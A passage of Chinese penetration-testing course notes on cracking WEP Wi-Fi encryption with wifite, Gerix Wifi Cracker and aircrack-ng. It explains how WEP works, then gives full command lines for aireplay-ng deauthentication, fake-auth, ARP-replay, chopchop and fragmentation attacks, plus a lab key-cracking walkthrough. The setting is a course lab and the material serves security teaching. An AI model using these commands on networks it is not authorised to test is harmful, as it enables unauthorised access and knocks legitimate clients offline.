title="3.扫描某个信道"></a>3.扫描某个信道</h3><pre class="line-numbers language-none"><code class="language-none">wifite -c 1-c:信道扫描目标<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-扫描wep加密类型的wifi"><a href="#4-扫描wep加密类型的wifi" class="headerlink" title="4.扫描wep加密类型的wifi"></a>4.扫描wep加密类型的wifi</h3><pre class="line-numbers language-none"><code class="language-none">wifite  -wep-wep&nbsp;&nbsp;只针对WEP网络&nbsp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-破解步骤"><a href="#3-破解步骤" class="headerlink" title="3.破解步骤"></a>3.破解步骤</h2><p>注意：学习时，需要提前在AP上连接一个STA，破解成功率比较高</p><h3 id="1-扫描wep加密类型的wifi"><a href="#1-扫描wep加密类型的wifi" class="headerlink" title="1.扫描wep加密类型的wifi"></a>1.扫描wep加密类型的wifi</h3><pre class="line-numbers language-none"><code class="language-none">wifite  -wep-wep&nbsp;&nbsp;只针对WEP网络&nbsp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-停止wifi扫描-1"><a href="#2-停止wifi扫描-1" class="headerlink" title="2.停止wifi扫描"></a>2.停止wifi扫描</h3><pre class="line-numbers language-none"><code class="language-none">ctrl+c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-选择要破解的AP"><a href="#3-选择要破解的AP" class="headerlink" title="3.选择要破解的AP"></a>3.选择要破解的AP</h3><pre class="line-numbers language-none"><code class="language-none">输入wifi扫描结果前的序号 1                cisco-1809     1  WEP   68db    no    1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="images/image-20211125131923614.png" alt="image-20211125131923614"></p><h3 id="4-等待ivs变多后，自动尝试破解"><a href="#4-等待ivs变多后，自动尝试破解" class="headerlink" title="4.等待ivs变多后，自动尝试破解"></a>4.等待ivs变多后，自动尝试破解</h3><p><img src="images/image-20211125132227530.png" alt="image-20211125132227530"></p><p><img src="images/image-20211127061713174.png" alt="image-20211127061713174"></p><h2 id="4-课堂小结"><a href="#4-课堂小结" class="headerlink" title="4.课堂小结"></a>4.课堂小结</h2><p>参考：课后笔记</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi06-gerix-wifi-cracker-zi-dong-hua-s-shen-tou-wep-jia-mi/di-6-zhang-wep-po-jie-gerix-wifi-cracker-zi-dong-hua-po-jie-wep-jia-mi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi06-gerix-wifi-cracker-zi-dong-hua-s-shen-tou-wep-jia-mi/di-6-zhang-wep-po-jie-gerix-wifi-cracker-zi-dong-hua-po-jie-wep-jia-mi/</url>
      
        <content type="html"><![CDATA[<h1 id="WEP破解-Gerix-wifi-cracker自动化破解WEP加密"><a href="#WEP破解-Gerix-wifi-cracker自动化破解WEP加密" class="headerlink" title="WEP破解-Gerix-wifi-cracker自动化破解WEP加密"></a>WEP破解-Gerix-wifi-cracker自动化破解WEP加密</h1><h2 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1.环境准备"></a><strong>1.环境准备</strong></h2><h3 id="1-软件和kali"><a href="#1-软件和kali" class="headerlink" title="1.软件和kali"></a>1.软件和kali</h3><p>Kali-Linux-2019.2-vmware-amd64</p><p>gerix-wifi-cracker-2</p><p>为什么不用2021版本的呢？因为gerix-wifi-cracker-2是基于PyQt4界面工具包开发的软件，2021版本自带的是PyQt5，版本不兼容</p><h3 id="2-下载软件，下载地址"><a href="#2-下载软件，下载地址" class="headerlink" title="2.下载软件，下载地址"></a>2.下载软件，下载地址</h3><pre class="line-numbers language-none"><code class="language-none">https://github.com/J4r3tt/gerix-wifi-cracker-2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-将软件复制到kali，解压"><a href="#3-将软件复制到kali，解压" class="headerlink" title="3.将软件复制到kali，解压"></a>3.将软件复制到kali，解压</h3><p><img src="images/image-20211118104925897.png" alt="image-20211118104925897"></p><h3 id="4-进入软件目录"><a href="#4-进入软件目录" class="headerlink" title="4.进入软件目录"></a>4.进入软件目录</h3><pre class="line-numbers language-none"><code class="language-none">cd gerix-wifi-cracker-2-master<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-破解步骤"><a href="#2-破解步骤" class="headerlink" title="2.破解步骤"></a>2.破解步骤</h2><h3 id="1-启动gerix-wifi-cracker-2-master软件"><a href="#1-启动gerix-wifi-cracker-2-master软件" class="headerlink" title="1.启动gerix-wifi-cracker-2-master软件"></a>1.启动gerix-wifi-cracker-2-master软件</h3><pre class="line-numbers language-none"><code class="language-none">python gerix.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-设置无线网卡位Monitor-Mode模式"><a href="#2-设置无线网卡位Monitor-Mode模式" class="headerlink" title="2.设置无线网卡位Monitor Mode模式"></a>2.设置无线网卡位Monitor Mode模式</h3><p><img src="images/image-20211118105038014.png" alt="image-20211118105038014"></p><h3 id="3-重新扫描网络"><a href="#3-重新扫描网络" class="headerlink" title="3.重新扫描网络"></a>3.重新扫描网络</h3><p><img src="images/image-20211118105100800.png" alt="image-20211118105100800"></p><h3 id="4-选择需要破解的WIFI"><a href="#4-选择需要破解的WIFI" class="headerlink" title="4.选择需要破解的WIFI"></a>4.选择需要破解的WIFI</h3><p><img src="images/image-20211118105121104.png" alt="image-20211118105121104"></p><h3 id="5-选择顶部【wep】，选择具体的破解方式【General-functionalities】"><a href="#5-选择顶部【wep】，选择具体的破解方式【General-functionalities】" class="headerlink" title="5.选择顶部【wep】，选择具体的破解方式【General functionalities】"></a>5.选择顶部【wep】，选择具体的破解方式【General functionalities】</h3><p><img src="images/image-20211118105142221.png" alt="image-20211118105142221"></p><h3 id="6-点击【Start-Sniffing-and-Logging】开始抓包"><a href="#6-点击【Start-Sniffing-and-Logging】开始抓包" class="headerlink" title="6.点击【Start Sniffing and Logging】开始抓包"></a>6.点击【Start Sniffing and Logging】开始抓包</h3><p><img src="images/image-20211118105204838.png" alt="image-20211118105204838"></p><p><img src="images/image-20211118105218563.png" alt="image-20211118105218563"></p><h3 id="7-连接一个客户端，使其发生ARP通讯"><a href="#7-连接一个客户端，使其发生ARP通讯" class="headerlink" title="7.连接一个客户端，使其发生ARP通讯"></a>7.连接一个客户端，使其发生ARP通讯</h3><h3 id="8-在客户端发送ping命令加快数据包收集（模拟用户上网数据）"><a href="#8-在客户端发送ping命令加快数据包收集（模拟用户上网数据）" class="headerlink" title="8.在客户端发送ping命令加快数据包收集（模拟用户上网数据）"></a>8.在客户端发送ping命令加快数据包收集（模拟用户上网数据）</h3><pre class="line-numbers language-none"><code class="language-none">ping /t  192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="9-使用python脚本加快收集速度（模拟用户上网数据）"><a href="#9-使用python脚本加快收集速度（模拟用户上网数据）" class="headerlink" title="9.使用python脚本加快收集速度（模拟用户上网数据）"></a>9.使用python脚本加快收集速度（模拟用户上网数据）</h3><pre class="line-numbers language-none"><code class="language-none">import osimport threadingimport timeclass myThread (threading.Thread):    def __init__(self):        threading.Thread.__init__(self)    def run(self):        cmd="ping /t 192.168.1.1"        os.system(cmd)        time.sleep(0.1)threads=[]for i in range(50):    thread1 = myThread()    thread1.start()    threads.append(thread1)for item in threads:    item.join()print ("退出主线程")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="10-等待Date到达5000时，可以开始破解"><a href="#10-等待Date到达5000时，可以开始破解" class="headerlink" title="10.等待Date到达5000时，可以开始破解"></a>10.等待Date到达5000时，可以开始破解</h3><p><img src="images/image-20211118105254947.png" alt="image-20211118105254947"></p><h3 id="11-选择顶部【Cracking】–点击【Aircrack-ng-Decrypt-WEP-password】开始破解"><a href="#11-选择顶部【Cracking】–点击【Aircrack-ng-Decrypt-WEP-password】开始破解" class="headerlink" title="11.选择顶部【Cracking】–点击【Aircrack-ng-Decrypt WEP password】开始破解"></a>11.选择顶部【Cracking】–点击【Aircrack-ng-Decrypt WEP password】开始破解</h3><p><img src="images/image-20211118122314228.png" alt="image-20211118122314228"></p><h3 id="12-抓包文件存放在：-x2F-root-x2F-gerix-wifi-cracker"><a href="#12-抓包文件存放在：-x2F-root-x2F-gerix-wifi-cracker" class="headerlink" title="12.抓包文件存放在： /root/.gerix-wifi-cracker"></a>12.抓包文件存放在： /root/.gerix-wifi-cracker</h3><pre class="line-numbers language-none"><code class="language-none">cd /root/.gerix-wifi-crackerls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="13-清空抓包结果"><a href="#13-清空抓包结果" class="headerlink" title="13.清空抓包结果"></a>13.清空抓包结果</h3><pre class="line-numbers language-none"><code class="language-none">cd /root/.gerix-wifi-crackerrm *<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-课后小结"><a href="#3-课后小结" class="headerlink" title="3.课后小结"></a>3.课后小结</h2><p>参考：课后笔记</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi05-aircrack-ng-shen-tou-wep-jia-mi/di-5-zhang-aircrack-ng-po-jie-wep-jia-mi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi05-aircrack-ng-shen-tou-wep-jia-mi/di-5-zhang-aircrack-ng-po-jie-wep-jia-mi/</url>
      
        <content type="html"><![CDATA[<h1 id="aircrack-ng破解WEP加密"><a href="#aircrack-ng破解WEP加密" class="headerlink" title="aircrack-ng破解WEP加密"></a>aircrack-ng破解WEP加密</h1><h2 id="1-WEP介绍"><a href="#1-WEP介绍" class="headerlink" title="1.WEP介绍"></a>1.WEP介绍</h2><p>其实我们平常在使用wifi的时候，往往会用到的加密方式主要有<strong>WEP（pre-RSNA）, WPA(TKIP), WPA2(CCMP-AES)</strong>, 如果有个别对安全要求比较高的也会使用<strong>企业级加密（802.1x）</strong>. 在最新的802.11-2010标准中，有明确的支持新的无线设备应该抛弃WEP和WPA加密方式，而且必须支持WPA2加密方式，但是不得不接受的是，现在我们是有的大多数设备并没有更新的这么快，广泛的WEP和WPA仍然在使用者，而且新开发的设备也应该保持对他们的兼容，所以即使在最新开发的产品中也并没有完全按照802.11-2010的要求，直接放弃对WEP和WPA的支持。</p><p>刚开始了解无线加密，也有必要从WEP加密开始掌握WEP-WPA-WPA2-802.1x等相关知识，一是这些东西至少在当前阶段还用的上，二是后面那些更高级的加密方法其实根本上还是基于WEP加密思想改进而来的。</p><p>其实无线加密主要是对数据在链路层进行加密，如下图，802.11主要是对physical[ˈfɪzɪkl]和Data-link层进行了定义，而数据链路层又分成两个部分，媒介访问控制（MAC）和逻辑链路控制（LLC），无线数据的加密处理就是在MAC和LLC两个阶段中间做的事情，加密的对象就是MSDU。</p><p><img src="images/image-20211111163427229.png" alt="image-20211111163427229"></p><p>所以对于没有MSDP的无线帧是不用加密的，比如管理帧只携带layer [ler] 2的信息，不需要加密；控制帧只有头部和尾部，不需要加密；空帧没有数据域（但有特定的功能），也不需要加密； 总之，需要加密的帧，往往是数据帧。</p><h2 id="2-认证类型"><a href="#2-认证类型" class="headerlink" title="2.认证类型"></a>2.认证类型</h2><p>加密的分类主要包括共享秘钥认证和开放系统认证，<strong>WEP加密是共享秘钥式</strong>，而TKIP、CCMP和802.1x则是开放系统，这两种分类个人觉得主要区别是先完成秘钥认证再进行关联，还是先完成关联再进行秘钥认证。比如，它要求无线客户端发送的authentication [ɔːˌθentɪˈkeɪʃn] 报文中指定加密方式，如果是共享秘钥就会进行秘钥的确认，如果是开放系统，则会留到后面关联成功后进行秘钥的确认。</p><h3 id="1-开放系统认证"><a href="#1-开放系统认证" class="headerlink" title="1.开放系统认证"></a>1.开放系统认证</h3><p>这种认证方式不需要确认STA的任何信息，它只是和AP进行一个招呼式的交互，这个过程中并没有交互身份信息，所以也可以认为是一个空加密。这样做的目的是，双方都认为应该在后面使用更安全的加密方式，在这里只是先打个招呼，STA先进来，我们慢慢坐下核对信息。所以STA发送的第一个Authentication [ɔːˌθentɪˈkeɪʃn] 报文只要表面自己使用的开放系统认证就好了，AP自然会给予successful答复，接着后面顺利完成关联。</p><p><img src="images/image-20211111163604849.png" alt="image-20211111163604849"></p><h3 id="2-共享秘钥认证"><a href="#2-共享秘钥认证" class="headerlink" title="2.共享秘钥认证"></a>2.共享秘钥认证</h3><p>这种认证方式使用WEP认证STA，所以这种认证的前提是STA和AP都有配置静态的WEP秘钥，因此认证的目的就是确认两者使用的秘钥是否一致。共享秘钥认证是通过4个认证帧的交互来完成的，STA首先发送一个Authentication request给AP，然后AP会给STA回复一个挑战<strong>明文</strong>，接着STA使用秘钥对这个明文进行加密并发送给ＡＰ，最后AP对其进行解密，如果能够解密成功并且明文一致则表示认证成功并回复。</p><p><img src="images/image-20211111163651921.png" alt="image-20211111163651921"></p><p>虽然看起来，共享秘钥认证比开放系统认证会更安全，其实实际上并不是这样，因为对于共享秘钥认证，攻击者可以捕获明文内容，也可以捕获加密后的密文，那就很容易被破解，而且秘钥一旦被破解，那么后面交互的所有数据包都能轻易的解密。</p><h2 id="3-加密算法介绍"><a href="#3-加密算法介绍" class="headerlink" title="3.加密算法介绍"></a>3.加密算法介绍</h2><p>根据加密算法的分类，可以分为同步加密算法和异步加密算法：</p><p>同步加密算法：这种算法不管是加密还是解密，都是<strong>使用同一个秘钥</strong>，为了确保数据的安全，就需要对这么秘钥进行保护，但问题是在进行认证的时候必须对这个秘钥进行确认，那么就需要提出一种安全的确认秘钥的方法，这些方法包括WEP, TKIP, and CCMP。</p><p>异步加密算法：这种算法包含了两个秘钥，分别是<strong>公钥和私钥</strong>，公钥用于消息的加密，私钥用于消息的解密，所以即使有好多人知道公钥，没有私钥也破解不了消息。</p><p>流加密和块加密： 流加密以<strong>一个bit为单位</strong>进行处理，块加密以<strong>一个块为单位</strong>进行处理</p><h2 id="4-WEP加密和解密"><a href="#4-WEP加密和解密" class="headerlink" title="4.WEP加密和解密"></a>4.WEP加密和解密</h2><h3 id="1-加密"><a href="#1-加密" class="headerlink" title="1.加密"></a>1.加密</h3><p>WEP是一个Layer 2的加密方法，它使用的是ARC4<strong>流加密</strong>。它有一个数据完整性校验操作，也就是<strong>Integrity Check Value (ICV)<strong>，这个值是通过计算为</strong>加密的数据域（MSDU）</strong>而来的。</p><p>802.11标准定义了两个WEP版本，分别是WEP-40和WEP-104支持64bit和128bit加密，其实<strong>40和104都是从64与128减24</strong>得来的，这**24位叫初始化向量Initialization Vector (IV)**，注意和ICV进行区分。</p><p><img src="images/image-20211111164258351.png" alt="image-20211111164258351"></p><p>40和104则是指静态秘钥的bit长度，也就是说</p><p>WEP-40支持输入10 hex characters or 5 ASCII characters,**10位16进制或5位ASCII字符 **</p><p>WEP-104支持输入26 hex characters or 13 ASCII characters:<strong>26位16进制或13位ASCII 字符</strong></p><p><img src="images/image-20211111164336784.png" alt="image-20211111164336784"></p><p>一般来说，WEP支持4个key，使用时从中选一个进行加密。</p><p>那么WEP加密过程是怎么实现的呢？下面根据流程图来分析一下</p><p><img src="images/image-20211111164636938.png" alt="image-20211111164636938"></p><p>（1） IV是动态生成的24bit随机数，标准没有指定应该怎么生成，而且在数据帧中以明文的方式进行发送，它和key结合生成随机种子（seed），然后运用CR4算法生成秘钥流（keystream）。</p><p>（2）对需要加密的明文进行<strong>CRC-32运算</strong>，生成 ICV（32位），然后将这个 ICV 追加到 plaintext的后面</p><p>（3）将尾部有 ICV的plaintext 与密码流进行<strong>异或运算</strong>，得到加密数据</p><p>（4）将 IV 添加到加密数据的前面，进行传送。</p><p>下面是WEP加密后的一个数据帧MPDU 格式：</p><p><img src="images/image-20211111164847496.png" alt="image-20211111164847496"></p><p>从上图可以看出，在帧体部分包括 <strong>IV + MSDU + ICV</strong>：</p><p>IV一共是4个字节，前3个字节是24bit的初始化向量，后面6bit暂时预留空白没用，最后两个bit用来指定使用哪个key，我们前面有提到过，WEP可以配置4个KEY。</p><p>MSDU和ICV是被加密的，在解密的时候，需要检验ICV是否一致</p><h3 id="2-解密"><a href="#2-解密" class="headerlink" title="2.解密"></a>2.解密</h3><p>和加密相反，解密也需要这几个过程：</p><p><img src="images/image-20211111164823217.png" alt="image-20211111164823217"></p><p>（1）IV和key结合生成随机种子（seed），然后运用ACR4算法生成秘钥流（keystream）</p><p>（2）将keystream和加密数据进行异或，得到 plaintext 和 ICV</p><p>（3）根据解密后得到的 plaintext 再计算一个 ICV 和包中的 ICV进行比较，判断是否相等，这也算是一个可靠性的保证。</p><h2 id="5-Aircrack-ng-常用工具包"><a href="#5-Aircrack-ng-常用工具包" class="headerlink" title="5.Aircrack-ng 常用工具包"></a>5.Aircrack-ng 常用工具包</h2><p>aircrack-ng：破解</p><p>airmon-ng：改变网卡工作模式，将网卡从Managed Mode 改变为 Monitor Mode</p><p>airodump-ng：抓包工具，用于捕获报文</p><p>aireplay-ng：提供各种攻击，为airodump-ng创造更多的报文</p><p>airserv-ng：网卡连接到指定端口 可以用来做无线跳板</p><p>airolib-ng：彩虹表破解创建数据库文件</p><p>airdecap-ng：解包</p><h2 id="6-Aireplay-ng-的-6-种攻击模式详解"><a href="#6-Aireplay-ng-的-6-种攻击模式详解" class="headerlink" title="6.Aireplay-ng 的 6 种攻击模式详解"></a>6.Aireplay-ng 的 6 种攻击模式详解</h2><h3 id="1-冲突模式"><a href="#1-冲突模式" class="headerlink" title="1.冲突模式"></a>1.冲突模式</h3><p>-0 Deautenticate 冲突模式</p><p>使已经连接的合法客户端强制断开与路由端的连接，使其重新连接。在重新连接过程中获得验证数据包，从而产生有效 ARP request。</p><p>如果一个客户端连在路由端上，但是没有人上网以产生有效数据，此时，即使用-3 也无法产生有效 ARP request。所以此时需要用-0 攻击模式配合，-3 攻击才会被立刻激活。</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 10 –a &lt;ap mac&gt; -c &lt;my mac&gt; wifi0【-0】：冲突攻击模式，后面跟发送次数（设置为 0，则为循环攻击，不停的断开连接，客户端无法正常上网）【-a】：设置 ap 的 mac【-c】：设置已连接的合法客户端的 mac。如果不设置-c，则断开所有和 ap 连接的合法客户端。aireplay-ng -3 -b &lt;ap mac&gt; -h &lt;my mac&gt; wifi0注：使用此攻击模式的前提是必须有通过认证的合法的客户端连接到路由器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-伪装客户端连接"><a href="#2-伪装客户端连接" class="headerlink" title="2.伪装客户端连接"></a>2.伪装客户端连接</h3><p>-1 fakeauth count 伪装客户端连接</p><p>这种模式是伪装一个客户端和 AP 进行连接。</p><p>这步是无客户端的研究学习的第一步，因为是无合法连接的客户端，因此需要一个伪装客户端来和路由器相连。为让 AP 接受数据包，必须使自己的网卡和 AP 关联。如果没有关联的话，目标 AP 将忽略所有从你网卡发送的数据包，IVS 数据将不会产生。</p><p>用-1 伪装客户端成功连接以后才能发送注入命令，让路由器接受到注入命令后才可反馈数据从而产生 ARP 包。</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -1 0 –e &lt;ap essid&gt; -a &lt;ap mac&gt; -h &lt;my mac&gt; wifi0参数说明：【-1】：伪装客户端连接模式，后面跟延时【-e】：设置 ap 的 essid【-a】：设置 ap 的 mac【-h】：设置伪装客户端的网卡 MAC（即自己网卡 mac）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-交互模式"><a href="#3-交互模式" class="headerlink" title="3.交互模式"></a>3.交互模式</h3><p>-2 Interactive 交互模式</p><p>这种攻击模式是一个抓包和提数据发攻击包，三种集合一起的模式</p><p>1．这种模式主要用于研究学习无客户端，先用-1 建立虚假客户端连接然后直接发包攻击 </p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -2 -p 0841 -c ff:ff:ff:ff:ff:ff -b &lt;ap mac&gt; -h &lt;my mac&gt; wifi0参数说明：【-2】：交互攻击模式【-p】：设置控制帧中包含的信息（16 进制），默认采用 0841【-c】：设置目标 mac 地址【-b】：设置 ap 的 mac 地址【-h】：设置伪装客户端的网卡 MAC（即自己网卡 mac）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2．提取包，发送注入数据包， 发包攻击。</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -2 –r &lt;file&gt; -x 1024 wifi0-x 1024 是限定发包速度，避免网卡死机，可以选择 1024<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-注入攻击模式"><a href="#4-注入攻击模式" class="headerlink" title="4.注入攻击模式"></a>4.注入攻击模式</h3><p>-3 ARP-request 注入攻击模式</p><p>这种模式是一种抓包后分析重发的过程 这种攻击模式很有效。既可以利用合法客户端，也可以配合-1 利用虚拟连接的伪装客户端。如果有合法客户端那一般需要等几分钟，让合法客户端和 ap 之间通信，少量数据就可产生有效 ARP request 才可利用-3模式注入成功。如果没有任何通信存在，不能得到 ARP request.，则这种攻击就会失败。</p><p>如果合法客户端和ap之间长时间内没有 ARP request，可以尝试同时使用-0 攻击. 如果没有合法客户端，则可以利用-1 建立虚拟连接的伪装客户端，连接过程中获得验证数据包，从而产生有效 ARP request。再通过-3 模式注入。</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -3 -b &lt;ap mac&gt; -h &lt;my mac&gt; -x 512 wifi0参数说明：【-3】：arp 注入攻击模式【-b】：设置 ap 的 mac【-h】：设置自己的mac地址【-x】：定义每秒发送数据户包的数量，但是最高不超过 1024，建议使用 512（也可不定义）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-Chopchop-攻击模式"><a href="#5-Chopchop-攻击模式" class="headerlink" title="5.Chopchop 攻击模式"></a>5.Chopchop 攻击模式</h3><p>-4 Chopchop 攻击模式</p><p>用以获得一个包含密钥数据的 xor 文件 这种模式主要是获得一个可利用包含密钥数据的 xor 文件，不能用来解密数据包。而是用它来产生一个新的数据包以便我们可以进行注入。</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -4 -b &lt;ap mac&gt; -h &lt;my mac&gt; wifi0 参数说明：【-b】：设置需要研究学习的 AP 的 mac【-h】：设置虚拟伪装连接的 mac（即自己网卡的 mac）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-碎片包攻击模式"><a href="#6-碎片包攻击模式" class="headerlink" title="6.碎片包攻击模式"></a>6.碎片包攻击模式</h3><p>-5 fragment 碎片包攻击模式</p><p>用以获得 PRGA(包含密钥的后缀为 xor 的文件) 这种模式主要是获得一个可利用 PRGA，这里的 PRGA 并不是 wep key 数据，不能用来解密数据包。而是用它来产生一个新的数据包以便我们可以进行注入。其工作原理就是使目标 AP 重新广播包，当 AP 重广播时，一个新的 IVS 将产生，我们就是利用这个来研究学习 </p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -5 -b &lt;ap mac&gt; -h &lt;my mac&gt; wifi0【-5】：碎片包攻击模式【-b】：设置 ap 的 mac【-h】：设置虚拟伪装连接的 mac（即自己网卡的 mac）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-WEP-wifi破解步骤"><a href="#7-WEP-wifi破解步骤" class="headerlink" title="7.WEP wifi破解步骤"></a>7.WEP wifi破解步骤</h2><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1.环境准备"></a>1.环境准备</h3><h4 id="1-路由器介绍"><a href="#1-路由器介绍" class="headerlink" title="1.路由器介绍"></a>1.路由器介绍</h4><p>课程使用的路由器为：思科企业级内置双天线cvr100无线路由器，支持WEP，WPA，WPS加密方式，一般的家用路由器或者比较新的路由器不支持以上三种模式。</p><h4 id="2-路由器配置"><a href="#2-路由器配置" class="headerlink" title="2.路由器配置"></a>2.路由器配置</h4><p>1.选择无线配置，设置wifi信道为1</p><p><img src="images/image-20211117100857932.png" alt="image-20211117100857932"></p><p>2.选择无线wifi–设置安全模式</p><p><img src="images/image-20211117100542595.png" alt="image-20211117100542595"></p><p>3.安全模式选择wep，输入口令-点击生成密钥，点击显示密钥，点击保存</p><p><img src="images/image-20211117100714891.png" alt="image-20211117100714891"></p><h3 id="2-查看网卡是否连接到kali"><a href="#2-查看网卡是否连接到kali" class="headerlink" title="2.查看网卡是否连接到kali"></a>2.查看网卡是否连接到kali</h3><pre class="line-numbers language-none"><code class="language-none">ip a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-开启Monitor-Mode工作模式"><a href="#3-开启Monitor-Mode工作模式" class="headerlink" title="3.开启Monitor Mode工作模式"></a>3.开启Monitor Mode工作模式</h3><pre class="line-numbers language-none"><code class="language-none">airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-扫描附近的wifi"><a href="#4-扫描附近的wifi" class="headerlink" title="4.扫描附近的wifi"></a>4.扫描附近的wifi</h3><p>确定目标wifi的信道，加密方式，信号强度，mac地址等信息</p><pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-对目标所在信道进行抓包"><a href="#5-对目标所在信道进行抓包" class="headerlink" title="5.对目标所在信道进行抓包"></a>5.对目标所在信道进行抓包</h3><pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon -c 1 --ivs -w /root/wifi/bk01/WEP --bssid D8:24:BD:79:18:0B-c:信道--ivs：初始化向量-w:输出抓包文件--bssid:指定wifi进行抓包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-手工创建客户端连接"><a href="#6-手工创建客户端连接" class="headerlink" title="6.手工创建客户端连接"></a>6.手工创建客户端连接</h3><pre class="line-numbers language-none"><code class="language-none">设备连接wifi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="7-进行ARP注入攻击"><a href="#7-进行ARP注入攻击" class="headerlink" title="7.进行ARP注入攻击"></a>7.进行ARP注入攻击</h3><p>arp重放攻击，通过模拟客户端发送ARP请求，获取AP的响应报文，通过AP报文获取ivs初始化向量</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -3 -b D8:24:BD:79:18:0B -h 18:CC:18:C5:D5:64 wlan0mon-3:arpreplay：arp重放攻击-b:bssid AP的mac地址-h:客户端的mac地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>遇到这个错误时，重新连接wifi会一直报【无法连接到该wifi】，这时候，需要ctrl+C停掉arp重放攻击，然后重新在发起一个新的arp重放攻击，在连接wifi就ok了</p><p><img src="images/image-20211117110615154.png" alt="image-20211117110615154"></p><h3 id="8-使用Deautenticate攻击模式"><a href="#8-使用Deautenticate攻击模式" class="headerlink" title="8.使用Deautenticate攻击模式"></a>8.使用Deautenticate攻击模式</h3><p>使已经连接的合法客户端强制断开与路由端的连接，使其重新连接。在重新连接过程中获得验证数据包，从而产生有效 ARP request。（也不一定能成功，不成功多试几次）</p><pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 5 -a D8:24:BD:79:18:0B -c 18:CC:18:C5:D5:64 wlan0mon-0：冲突攻击模式，后面跟发送次数（设置为 0，则为循环攻击，不停的断开连接，客户端无法正常上网）-a:设置 ap 的 mac-c：设置已连接的合法客户端的 mac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="9-手动连接AP"><a href="#9-手动连接AP" class="headerlink" title="9.手动连接AP"></a>9.手动连接AP</h3><p>等待Frame到5-10万时，就可以尝试破解了</p><p><img src="images/image-20211116164029929.png" alt="image-20211116164029929"></p><h3 id="10-破解WIFI，获取WEP密码"><a href="#10-破解WIFI，获取WEP密码" class="headerlink" title="10.破解WIFI，获取WEP密码"></a>10.破解WIFI，获取WEP密码</h3><pre class="line-numbers language-none"><code class="language-none">aircrack-ng /root/wifi/bk01/WEP-01.ivs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>遇到这种说明ivs样本不够，按ctrl+c退出，在等一会重新执行破解命令就可以。也可以在这个界面保持不动，当ivs达到5000时，他会自动重新破解</p><p><img src="images/image-20211117105203267.png" alt="image-20211117105203267"></p><p>ivs样本足够时，很快就能破解出来了</p><p><img src="images/image-20211116165048843.png" alt="image-20211116165048843"></p><h2 id="8-课程小结"><a href="#8-课程小结" class="headerlink" title="8.课程小结"></a>8.课程小结</h2><p>参考：课后笔记</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi04-shou-xi-kismet/di-4-zhang-shou-xi-kismet/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/30-wu-xian-wifi-an-quan/wifi04-shou-xi-kismet/di-4-zhang-shou-xi-kismet/</url>
      
